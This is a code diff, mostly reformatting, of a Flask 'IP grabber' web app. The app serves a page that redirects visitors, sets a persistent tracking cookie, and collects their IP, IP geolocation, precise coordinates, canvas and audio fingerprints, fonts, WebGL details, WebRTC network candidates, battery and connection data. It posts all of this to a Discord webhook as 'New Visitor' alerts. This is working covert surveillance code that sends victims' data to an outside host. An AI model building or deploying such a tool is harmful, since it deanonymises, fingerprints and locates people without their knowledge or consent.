@@ -5,13 +5,12 @@ import threading
 import uuid
 from datetime import datetime, timezone
 import requests
-from flask import Flask, request, Response, make_response
+from flask import Flask, request, make_response
 from dotenv import load_dotenv
 
 load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))
 
 app = Flask(__name__)
-
 
 # environment variables
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
@@ -26,21 +25,15 @@ def _send_to_discord(payload):
         return
 
     try:
-        response = requests.post(
-            DISCORD_WEBHOOK_URL,
-            json=payload,
-            timeout=5
-        )
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
 
         if response.status_code not in (200, 204):
-            print(
-                "Discord webhook error:",
-                response.status_code,
-                response.text[:1000]
-            )
+            print("Discord webhook error:", response.status_code,
+                  response.text[:1000])
 
     except requests.RequestException as e:
         print("Discord request error:", e)
+
 
 def format_webrtc(webrtc):
     if not isinstance(webrtc, dict):
@@ -75,15 +68,14 @@ def format_webrtc(webrtc):
             icon = "❓"
             description = "Unknown candidate"
 
-        lines.append(
-            f"{icon} **Candidate {i}**\n"
-            f"Type: `{candidate_type}` — {description}\n"
-            f"Address: `{address}`\n"
-            f"Protocol: `{protocol}`\n"
-            f"Port: `{port}`"
-        )
+        lines.append(f"{icon} **Candidate {i}**\n"
+                     f"Type: `{candidate_type}` — {description}\n"
+                     f"Address: `{address}`\n"
+                     f"Protocol: `{protocol}`\n"
+                     f"Port: `{port}`")
 
     return "\n\n".join(lines)[:1024]
+
 
 def format_fonts(fonts):
     if not isinstance(fonts, dict):
@@ -99,20 +91,16 @@ def format_fonts(fonts):
     max_fonts = 35
     displayed = detected[:max_fonts]
 
-    lines = [
-        f"**Detected:** `{count}` fonts",
-        ""
-    ]
+    lines = [f"**Detected:** `{count}` fonts", ""]
 
     for font in displayed:
         lines.append(f"• `{font}`")
 
     if len(detected) > max_fonts:
-        lines.append(
-            f"\n*…and {len(detected) - max_fonts} more*"
-        )
+        lines.append(f"\n*…and {len(detected) - max_fonts} more*")
 
     return "\n".join(lines)[:1024]
+
 
 def format_location(location):
     if not isinstance(location, dict):
@@ -132,19 +120,15 @@ def format_location(location):
     if latitude is None or longitude is None:
         return "⚠️ Coordinates unavailable"
 
-    accuracy_text = (
-        f"{round(float(accuracy), 1)} m"
-        if accuracy is not None
-        else "unknown"
-    )
+    accuracy_text = (f"{round(float(accuracy), 1)} m"
+                     if accuracy is not None else "unknown")
 
-    return (
-        f"📍 **Latitude:** `{latitude}`\n"
-        f"📍 **Longitude:** `{longitude}`\n"
-        f"🎯 **Accuracy:** `{accuracy_text}`\n\n"
-        f"[🗺️ Open in Google Maps]"
-        f"(https://www.google.com/maps?q={latitude},{longitude})"
-    )[:1024]
+    return (f"📍 **Latitude:** `{latitude}`\n"
+            f"📍 **Longitude:** `{longitude}`\n"
+            f"🎯 **Accuracy:** `{accuracy_text}`\n\n"
+            f"[🗺️ Open in Google Maps]"
+            f"(https://www.google.com/maps?q={latitude},{longitude})")[:1024]
+
 
 def notify_discord(data):
     if not DISCORD_WEBHOOK_URL:
@@ -178,169 +162,163 @@ def notify_discord(data):
         rtt = network.get("rtt")
         save_data = network.get("saveData")
 
-        network_text = (
-            f"**Connection:** `{effective_type.upper()}`\n"
-            f"**Type:** `{connection_type}`\n"
-            f"**Download:** `{downlink} Mbps`\n"
-            f"**Latency:** `{rtt} ms`\n"
-            f"**Data Saver:** `{'On' if save_data else 'Off'}`"
-        )
-
-
+        network_text = (f"**Connection:** `{effective_type.upper()}`\n"
+                        f"**Type:** `{connection_type}`\n"
+                        f"**Download:** `{downlink} Mbps`\n"
+                        f"**Latency:** `{rtt} ms`\n"
+                        f"**Data Saver:** `{'On' if save_data else 'Off'}`")
 
     def clean(value, limit=100):
-        if value is None: 
-            return "unknown" 
+        if value is None:
+            return "unknown"
 
-        value = str(value) 
+        value = str(value)
 
-        if not value: 
-            return "unknown" 
+        if not value:
+            return "unknown"
 
         return value[:limit]
 
-    
-    fields = [ 
+    fields = [
         {
-    "name": "🌐 IP & 📍 Location",
-    "value": (
-        f"**IP:** `{clean(data.get('ip'))}`\n\n"
-        f"{format_location(data.get('location'))}"
-    )[:1024],
-    "inline": False,
-},
-        { 
-            "name": "Country", 
-            "value": clean(data.get("country")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "City", 
-            "value": clean(data.get("city")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "ISP", 
-            "value": clean(data.get("isp")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "ASN", 
-            "value": clean(data.get("asn")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "Browser", 
-            "value": clean(data.get("browser")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "OS", 
-            "value": clean(data.get("os")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "Device", 
-            "value": clean(data.get("device")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "Language", 
-            "value": clean(data.get("language")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "Timezone", 
-            "value": clean(data.get("timezone")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "Screen", 
-            "value": clean(data.get("screen")), 
-            "inline": True, 
-        }, 
-        { 
+            "name":
+            "🌐 IP & 📍 Location",
+            "value": (f"**IP:** `{clean(data.get('ip'))}`\n\n"
+                      f"{format_location(data.get('location'))}")[:1024],
+            "inline":
+            False,
+        },
+        {
+            "name": "Country",
+            "value": clean(data.get("country")),
+            "inline": True,
+        },
+        {
+            "name": "City",
+            "value": clean(data.get("city")),
+            "inline": True,
+        },
+        {
+            "name": "ISP",
+            "value": clean(data.get("isp")),
+            "inline": True,
+        },
+        {
+            "name": "ASN",
+            "value": clean(data.get("asn")),
+            "inline": True,
+        },
+        {
+            "name": "Browser",
+            "value": clean(data.get("browser")),
+            "inline": True,
+        },
+        {
+            "name": "OS",
+            "value": clean(data.get("os")),
+            "inline": True,
+        },
+        {
+            "name": "Device",
+            "value": clean(data.get("device")),
+            "inline": True,
+        },
+        {
+            "name": "Language",
+            "value": clean(data.get("language")),
+            "inline": True,
+        },
+        {
+            "name": "Timezone",
+            "value": clean(data.get("timezone")),
+            "inline": True,
+        },
+        {
+            "name": "Screen",
+            "value": clean(data.get("screen")),
+            "inline": True,
+        },
+        {
             "name": "Referrer",
             "value": clean(data.get("referer")),
-            "inline": False, 
-        }, 
-        { 
-            "name": "Path", 
-            "value": clean(data.get("path")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "Method", 
-            "value": clean(data.get("method")), 
-            "inline": True, 
-        }, 
-        { 
-            "name": "User-Agent", 
-            "value": clean(data.get("user_agent")), 
-            "inline": False, 
-        }, 
+            "inline": False,
+        },
         {
-    "name": "Canvas Fingerprint",
-    "value": clean(data.get("canvasFingerprint")),
-    "inline": False,
-},
-{
-    "name": "Audio Fingerprint",
-    "value": clean(data.get("audioFingerprint")),
-    "inline": False,
-},
-{
-    "name": "Font Detection",
-    "value": format_fonts(data.get("fonts")),
-    "inline": False,
-},
-{
-    "name": "WebGL Vendor",
-    "value": clean(data.get("webglVendor")),
-    "inline": True,
-},
-{
-    "name": "WebGL Renderer",
-    "value": clean(data.get("webglRenderer")),
-    "inline": True,
-},
-{
-    "name": "🌐 WebRTC Network",
-    "value": format_webrtc(data.get("webrtc")),
-    "inline": False,
-},
-{
-    "name": "Visitor ID",
-    "value": clean(data.get("visitor_id")),
-    "inline": False,
-},
-{
-    "name": "Returning Visitor",
-    "value": clean(data.get("returning_visitor")),
-    "inline": True,
-},
-{
-    "name": "🔋 Battery",
-    "value": battery_text,
-    "inline": False,
-},
-{
-    "name": "📶 Network",
-    "value": network_text,
-    "inline": False,
-},
+            "name": "Path",
+            "value": clean(data.get("path")),
+            "inline": True,
+        },
+        {
+            "name": "Method",
+            "value": clean(data.get("method")),
+            "inline": True,
+        },
+        {
+            "name": "User-Agent",
+            "value": clean(data.get("user_agent")),
+            "inline": False,
+        },
+        {
+            "name": "Canvas Fingerprint",
+            "value": clean(data.get("canvasFingerprint")),
+            "inline": False,
+        },
+        {
+            "name": "Audio Fingerprint",
+            "value": clean(data.get("audioFingerprint")),
+            "inline": False,
+        },
+        {
+            "name": "Font Detection",
+            "value": format_fonts(data.get("fonts")),
+            "inline": False,
+        },
+        {
+            "name": "WebGL Vendor",
+            "value": clean(data.get("webglVendor")),
+            "inline": True,
+        },
+        {
+            "name": "WebGL Renderer",
+            "value": clean(data.get("webglRenderer")),
+            "inline": True,
+        },
+        {
+            "name": "🌐 WebRTC Network",
+            "value": format_webrtc(data.get("webrtc")),
+            "inline": False,
+        },
+        {
+            "name": "Visitor ID",
+            "value": clean(data.get("visitor_id")),
+            "inline": False,
+        },
+        {
+            "name": "Returning Visitor",
+            "value": clean(data.get("returning_visitor")),
+            "inline": True,
+        },
+        {
+            "name": "🔋 Battery",
+            "value": battery_text,
+            "inline": False,
+        },
+        {
+            "name": "📶 Network",
+            "value": network_text,
+            "inline": False,
+        },
     ]
-    payload = { 
-        "embeds": [ 
-            { 
-                "title": "New Visitor", 
-                "color": 5814783, 
-                "fields": fields, 
-                "timestamp": datetime.now(timezone.utc).isoformat(), 
-            } 
-        ] 
+    payload = {
+        "embeds": [{
+            "title": "New Visitor",
+            "color": 5814783,
+            "fields": fields,
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+        }]
     }
-    threading.Thread(target=_send_to_discord, args=(payload,), daemon=True).start()
+    threading.Thread(target=_send_to_discord, args=(payload, ),
+                     daemon=True).start()
 
 
 # Ip of User
@@ -363,22 +341,40 @@ def collect_http_data():
         headers[key] = value
 
     return {
-        "ip": get_client_ip(),
-        "timestamp": datetime.now( timezone.utc ).isoformat(),
-        "method": request.method,
-        "path": request.path,
-        "query_string": request.query_string.decode( "utf-8", errors="replace" )[:5000],
-        "full_url": request.url[:5000],
-        "host": request.host,
-        "scheme": request.scheme,
-        "protocol": request.environ.get( "SERVER_PROTOCOL" ),
-        "referer": request.headers.get( "Referer", "" )[:2000],
-        "user_agent": request.headers.get( "User-Agent", "" )[:2000],
-        "accept": request.headers.get( "Accept", "" )[:1000],
-        "accept_language": request.headers.get( "Accept-Language", "" )[:1000],
-        "accept_encoding": request.headers.get( "Accept-Encoding", "" )[:1000],
-        "content_type": request.headers.get( "Content-Type", "" )[:1000],
-        "content_length": request.content_length, "headers": headers, 
+        "ip":
+        get_client_ip(),
+        "timestamp":
+        datetime.now(timezone.utc).isoformat(),
+        "method":
+        request.method,
+        "path":
+        request.path,
+        "query_string":
+        request.query_string.decode("utf-8", errors="replace")[:5000],
+        "full_url":
+        request.url[:5000],
+        "host":
+        request.host,
+        "scheme":
+        request.scheme,
+        "protocol":
+        request.environ.get("SERVER_PROTOCOL"),
+        "referer":
+        request.headers.get("Referer", "")[:2000],
+        "user_agent":
+        request.headers.get("User-Agent", "")[:2000],
+        "accept":
+        request.headers.get("Accept", "")[:1000],
+        "accept_language":
+        request.headers.get("Accept-Language", "")[:1000],
+        "accept_encoding":
+        request.headers.get("Accept-Encoding", "")[:1000],
+        "content_type":
+        request.headers.get("Content-Type", "")[:1000],
+        "content_length":
+        request.content_length,
+        "headers":
+        headers,
     }
 
 
@@ -387,77 +383,81 @@ def detect_browser(user_agent):
     if "edg/" in ua:
         return "Microsoft Edge"
     if "opr/" in ua or "opera" in ua:
-        return "Opera" 
-    if "chrome/" in ua and "chromium" not in ua: 
-        return "Google Chrome" 
-    if "firefox/" in ua: 
-        return "Mozilla Firefox" 
-    if "safari/" in ua and "chrome/" not in ua: 
-        return "Safari" 
-    if "chromium" in ua: 
-        return "Chromium" 
+        return "Opera"
+    if "chrome/" in ua and "chromium" not in ua:
+        return "Google Chrome"
+    if "firefox/" in ua:
+        return "Mozilla Firefox"
+    if "safari/" in ua and "chrome/" not in ua:
+        return "Safari"
+    if "chromium" in ua:
+        return "Chromium"
     return "Unknown"
 
-def detect_os(user_agent): 
-    ua = user_agent.lower() 
-    if "windows" in ua: 
-        return "Windows" 
-    if "android" in ua: 
-        return "Android" 
-    if "iphone" in ua or "ipad" in ua or "ios" in ua: 
-        return "iOS" 
-    if "mac os x" in ua: 
-        return "macOS" 
-    if "linux" in ua: 
-        return "Linux" 
-    if "cros" in ua: 
-        return "ChromeOS" 
+
+def detect_os(user_agent):
+    ua = user_agent.lower()
+    if "windows" in ua:
+        return "Windows"
+    if "android" in ua:
+        return "Android"
+    if "iphone" in ua or "ipad" in ua or "ios" in ua:
+        return "iOS"
+    if "mac os x" in ua:
+        return "macOS"
+    if "linux" in ua:
+        return "Linux"
+    if "cros" in ua:
+        return "ChromeOS"
     return "Unknown"
 
-def detect_device(user_agent): 
-    ua = user_agent.lower() 
-    if "ipad" in ua: 
-        return "Tablet" 
-    if "tablet" in ua: 
-        return "Tablet" 
-    if ( "mobile" in ua or "iphone" in ua or "android" in ua ): 
-        return "Mobile" 
+
+def detect_device(user_agent):
+    ua = user_agent.lower()
+    if "ipad" in ua:
+        return "Tablet"
+    if "tablet" in ua:
+        return "Tablet"
+    if ("mobile" in ua or "iphone" in ua or "android" in ua):
+        return "Mobile"
     return "Desktop"
 
+
 # Ip geolocation
-def get_ip_information(ip): 
-    if not ip: 
-        return {} 
-    try: 
-        response = requests.get( 
-            f"http://ip-api.com/json/{ip}", 
-            params={ 
-                "fields": 
-                  (
-                    "status,message,country,countryCode,"
-                    "region,regionName,city,zip,lat,lon," 
-                    "timezone,isp,org,as,reverse,proxy,hosting" 
-                  ) 
-                }, 
-            timeout=4 
-        ) 
-        if response.status_code != 200: 
-            return {} 
-        data = response.json() 
-        if data.get("status") != "success": 
-            return {} 
+def get_ip_information(ip):
+    if not ip:
+        return {}
+    try:
+        response = requests.get(
+            f"http://ip-api.com/json/{ip}",
+            params={
+                "fields": ("status,message,country,countryCode,"
+                           "region,regionName,city,zip,lat,lon,"
+                           "timezone,isp,org,as,reverse,proxy,hosting")
+            },
+            timeout=4)
+        if response.status_code != 200:
+            return {}
+        data = response.json()
+        if data.get("status") != "success":
+            return {}
         return {
-          "country": data.get("country"), 
-          "country_code": data.get("countryCode"),
-          "region": data.get("regionName"), 
-          "city": data.get("city"), "postal_code": data.get("zip"), 
-          "latitude": data.get("lat"), "longitude": data.get("lon"), 
-          "timezone": data.get("timezone"), "isp": data.get("isp"),
-          "organization": data.get("org"), "asn": data.get("as"), 
-          "reverse_dns": data.get("reverse"), "proxy": data.get("proxy"),
-          "hosting": data.get("hosting"), 
-        } 
-    except (requests.RequestException, ValueError): 
+            "country": data.get("country"),
+            "country_code": data.get("countryCode"),
+            "region": data.get("regionName"),
+            "city": data.get("city"),
+            "postal_code": data.get("zip"),
+            "latitude": data.get("lat"),
+            "longitude": data.get("lon"),
+            "timezone": data.get("timezone"),
+            "isp": data.get("isp"),
+            "organization": data.get("org"),
+            "asn": data.get("as"),
+            "reverse_dns": data.get("reverse"),
+            "proxy": data.get("proxy"),
+            "hosting": data.get("hosting"),
+        }
+    except (requests.RequestException, ValueError):
         return {}
 
 
@@ -1035,6 +1035,7 @@ async function getCanvasFingerprint() {
 </html>
 """
 
+
 def get_or_create_visitor_id():
     visitor_id = request.cookies.get("visitor_id")
 
@@ -1043,7 +1044,9 @@ def get_or_create_visitor_id():
 
     return str(uuid.uuid4()), False
 
+
 # visitor route
+
 
 @app.route("/")
 def index():
@@ -1061,36 +1064,25 @@ def index():
     geo = get_ip_information(data.get("ip"))
     data.update(geo)
 
-    data["response_time_ms"] = round(
-        (time.perf_counter() - start) * 1000,
-        2
-    )
+    data["response_time_ms"] = round((time.perf_counter() - start) * 1000, 2)
 
     visitor_id, is_new = get_or_create_visitor_id()
 
     data["visitor_id"] = visitor_id
     data["returning_visitor"] = not is_new
 
-    page = BROWSER_PAGE.replace(
-        "__REDIRECT_URL__",
-        json.dumps(REDIRECT_URL)
-    )
+    page = BROWSER_PAGE.replace("__REDIRECT_URL__", json.dumps(REDIRECT_URL))
 
-    response = make_response(
-        page,
-        200
-    )
+    response = make_response(page, 200)
 
     # First-party persistent visitor identifier.
     if is_new:
-        response.set_cookie(
-            "visitor_id",
-            visitor_id,
-            max_age=60 * 60 * 24 * 365,
-            httponly=True,
-            secure=True,
-            samesite="Lax"
-        )
+        response.set_cookie("visitor_id",
+                            visitor_id,
+                            max_age=60 * 60 * 24 * 365,
+                            httponly=True,
+                            secure=True,
+                            samesite="Lax")
 
     return response
 
@@ -1100,9 +1092,7 @@ def index():
 def collect():
 
     try:
-        browser_data = request.get_json(
-            silent=True
-        ) or {}
+        browser_data = request.get_json(silent=True) or {}
 
         server_data = collect_http_data()
 
@@ -1111,48 +1101,30 @@ def collect():
         browser_data["visitor_id"] = visitor_id
         browser_data["returning_visitor"] = visitor_id is not None
 
-        user_agent = server_data.get(
-            "user_agent",
-            ""
-        )
+        user_agent = server_data.get("user_agent", "")
 
         # Server-side information
         browser_data["ip"] = get_client_ip()
 
-        browser_data["browser"] = detect_browser(
-            user_agent
-        )
+        browser_data["browser"] = detect_browser(user_agent)
 
-        browser_data["os"] = detect_os(
-            user_agent
-        )
+        browser_data["os"] = detect_os(user_agent)
 
-        browser_data["device"] = detect_device(
-            user_agent
-        )
+        browser_data["device"] = detect_device(user_agent)
 
         # WebGL data for Discord
         webgl = browser_data.get("webgl")
 
         if isinstance(webgl, dict):
-            browser_data["webglVendor"] = webgl.get(
-                "vendor"
-            )
+            browser_data["webglVendor"] = webgl.get("vendor")
 
-            browser_data["webglRenderer"] = webgl.get(
-                "renderer"
-            )
+            browser_data["webglRenderer"] = webgl.get("renderer")
 
-        browser_data["server_timestamp"] = (
-            datetime.now(
-                timezone.utc
-            ).isoformat()
-        )
+        browser_data["server_timestamp"] = (datetime.now(
+            timezone.utc).isoformat())
 
         # Add IP geolocation
-        geo = get_ip_information(
-            browser_data["ip"]
-        )
+        geo = get_ip_information(browser_data["ip"])
 
         browser_data.update(geo)
 
@@ -1171,36 +1143,19 @@ def collect():
             for k, v in browser_data.items()
         }
 
-        print(
-            "\n========== BROWSER TELEMETRY =========="
-        )
+        print("\n========== BROWSER TELEMETRY ==========")
 
-        print(
-            json.dumps(
-                safe_browser_data,
-                indent=2,
-                ensure_ascii=False
-            )
-        )
+        print(json.dumps(safe_browser_data, indent=2, ensure_ascii=False))
 
-        print(
-            "========================================\n"
-        )
+        print("========================================\n")
 
-        return {
-            "status": "ok"
-        }, 200
+        return {"status": "ok"}, 200
 
     except Exception as e:
 
-        print(
-            "Telemetry error:",
-            str(e)
-        )
+        print("Telemetry error:", str(e))
 
-        return {
-            "status": "error"
-        }, 400  
+        return {"status": "error"}, 400
 
 
 # run the app
